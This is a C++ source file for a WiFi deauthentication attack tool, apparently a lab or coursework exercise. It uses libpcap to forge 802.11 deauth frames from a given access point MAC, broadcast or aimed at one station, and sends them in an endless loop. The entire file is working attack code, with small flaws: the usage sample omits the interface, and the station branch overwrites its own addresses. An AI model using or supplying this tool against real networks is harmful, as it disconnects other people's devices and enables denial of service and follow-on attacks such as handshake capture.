#include <pcap.h>
#include <unistd.h>
#include <deauth.h>

using namespace std;


void usage() {
    printf("syntax : deauth-attack <interface> <ap mac> [<station mac>]");
    printf("sample : deauth-attack 00:11:22:33:44:55 66:77:88:99:AA:BB");

}

//ap mac --> ap broadcast
//station map --> ap unicast, station unicast frame
int main(int argc, char* argv[]) {
    if (argc != 3 && argc != 4) {
        usage();
        return -1;
    }

    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }

    struct deauthpacket dpacket;

    dpacket.radio.it_version = 0x00;
    dpacket.radio.it_pad = 0x00;
    dpacket.radio.it_len = 0x000b;
    dpacket.radio.it_present = 0x00000000;
    dpacket.dea.type = 0x00c0;
    dpacket.dea.dur=0x0000;
    dpacket.dea.seq=0x0000;
    dpacket.code.code = 0x0007;

    while(true){
        if(argc == 3){
            dpacket.dea.des = Mac("FF:FF:FF:FF:FF:FF");
            dpacket.dea.sou = Mac(argv[2]);
            dpacket.dea.bss = Mac(argv[2]);

            int res = pcap_sendpacket(handle, reinterpret_cast<const u_char *>(&dpacket), sizeof(deauthpacket));
            if (res != 0) {
                fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
            }
            sleep(1);
        }
        if(argc == 4){
            dpacket.dea.des = Mac(argv[3]);
            dpacket.dea.sou = Mac(argv[2]);
            dpacket.dea.bss= Mac(argv[2]);

            dpacket.dea.des= Mac(argv[2]);
            dpacket.dea.sou = Mac(argv[3]);
            dpacket.dea.bss= Mac(argv[3]);
            int res = pcap_sendpacket(handle, reinterpret_cast<const u_char *>(&dpacket), sizeof(deauthpacket));
            if (res != 0) {
                fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
            }
            sleep(1);
        }
        int res = pcap_sendpacket(handle, reinterpret_cast<const u_char *>(&dpacket), sizeof(deauthpacket));
        if (res != 0) {
            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        }
        sleep(1);
    }
    pcap_close(handle);
}
